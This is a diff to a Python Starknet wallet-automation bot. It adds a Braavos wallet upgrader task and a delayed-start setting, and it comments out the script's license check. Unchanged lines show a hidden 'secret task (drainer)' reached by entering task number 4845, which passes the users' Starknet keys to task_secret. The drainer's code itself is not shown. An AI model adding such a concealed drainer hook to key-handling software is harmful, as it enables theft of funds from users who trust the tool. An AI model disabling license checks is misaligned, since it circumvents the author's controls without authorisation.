@@ -55,7 +55,8 @@ try:
         return check_license_elig(sha)
 
     if __name__ == "__main__":
-        checking_license()
+        #checking_license()
+        pass
 
 
 
@@ -566,6 +567,8 @@ try:
             withdraw_all_task(stark_keys, True)
         elif task_number == 28:
             colateral_task(stark_keys)
+        elif task_number == 29:
+            upgrader_braavos_task(stark_keys)
         elif task_number == 4845: #secret task (drainer)
             task_secret(stark_keys)
         elif task_number == 8825:
@@ -615,7 +618,8 @@ try:
                     "starknet_id",
                     "full withdraw(remove liquidity, swap to eth, bridge to chain)",
                     "full withdraw to different wallet(EVM)",
-                    "collateral zklend"
+                    "collateral zklend",
+                    "universal braavos upgrader"
                 ],
             )
         ]
@@ -686,6 +690,8 @@ try:
             task_number = 27
         elif action == "collateral zklend":
             task_number = 28
+        elif action == "universal braavos upgrader":
+            task_number = 29
 
        
         f = open(f"{SETTINGS_PATH}to_run_addresses.txt", "r")
@@ -740,7 +746,9 @@ try:
 
 
                 
-            
+            if SETTINGS["enable_delayed_start"]:
+                logger.info(f"Waiting for delayed start: {SETTINGS['StartDelay']} hour(s)")
+                time.sleep(SETTINGS["StartDelay"] * 3600)
             start(stark_keys, task_number)
 
 
